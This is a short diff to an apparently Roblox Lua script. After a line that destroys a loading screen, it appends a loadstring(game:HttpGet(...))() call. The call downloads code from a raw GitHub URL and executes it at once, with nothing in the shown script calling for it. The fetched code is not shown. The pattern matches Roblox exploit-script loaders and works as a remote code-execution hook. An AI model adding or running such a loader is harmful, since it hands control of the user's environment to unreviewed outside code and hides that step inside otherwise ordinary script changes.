@@ -89,3 +89,5 @@ end
 
 -- Remove the loading screen
 screenGui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zeeo6969/nameofurscript/refs/heads/main/freezeforcevisual"))()
